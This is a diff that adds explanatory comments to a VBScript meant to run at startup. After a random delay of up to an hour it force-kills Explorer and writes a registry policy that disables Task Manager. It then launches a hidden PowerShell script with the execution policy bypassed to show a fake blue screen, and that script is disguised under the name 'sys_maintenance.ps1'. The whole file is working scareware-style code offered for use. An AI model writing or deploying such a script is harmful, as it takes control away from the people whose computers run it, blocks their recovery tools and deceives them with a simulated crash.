@@ -1,21 +1,24 @@
-Dim objShell, WshShell, delay
+'This VBScript runs at startup. It waits a random interval (between 1 and 60 minutes), terminates Explorer and disables Task Manager, and then launches the fake BSOD PowerShell script.
 
+' Create WScript Shell objects for executing system commands
+Dim objShell, WshShell, delay
 Set objShell = CreateObject("WScript.Shell")
 Set WshShell = CreateObject("WScript.Shell")
 
-' Generate a truly random delay between 1 minute (60,000ms) and 60 minutes (3,600,000ms)
+' Seed the random number generator and calculate a random delay (1-60 minutes)
 Randomize
-delay = Int((Rnd * 60) + 1) * 60000 ' Random delay in milliseconds
+delay = Int((Rnd * 60) + 1) * 60000  ' Delay in milliseconds
 
-WScript.Sleep delay ' Wait for the random time
+' Pause execution for the random delay period
+WScript.Sleep delay
 
-' Disable Task Manager & Explorer
+' Terminate Explorer to simulate system instability and disable Task Manager for realism
 objShell.Run "taskkill /F /IM explorer.exe", 0, True
 objShell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", 0, True
 
-' Launch the fake BSOD
+' Launch the PowerShell script (sys_maintenance.ps1) to display the fake BSOD
 objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %USERPROFILE%\sys_maintenance.ps1", 0, True
 
-' Clean up
+' Clean up shell objects
 Set objShell = Nothing
 Set WshShell = Nothing
